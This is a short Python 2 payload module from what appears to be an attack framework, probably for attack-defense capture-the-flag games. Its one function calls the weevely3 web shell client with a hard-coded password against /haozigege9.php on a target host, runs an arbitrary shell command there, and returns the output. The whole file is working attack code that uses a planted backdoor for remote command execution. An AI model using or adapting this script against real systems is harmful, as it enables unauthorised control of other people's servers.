#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:
    
    weevely backdoor
    
    '''
    import os
    import hashlib 

    try:
        url = '/haozigege9.php'
        # my_shared_key = hashlib.md5('haozigege').hexdigest()
        my_shared_key = 'd951118f'
        open('data/weevely.key','w').write(my_shared_key)
        system_cmd = "python utils/weevely3/weevely.py http://%s:%d%s haozigege \":shell_sh '%s'\" 2>&1"%(target,int(target_port),url,cmd)
        debug_print('system_cmd => ' + system_cmd)
        res = os.popen(system_cmd).read()
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error(target,"attack failed","sample.py attack")
        res = "error"

    return res




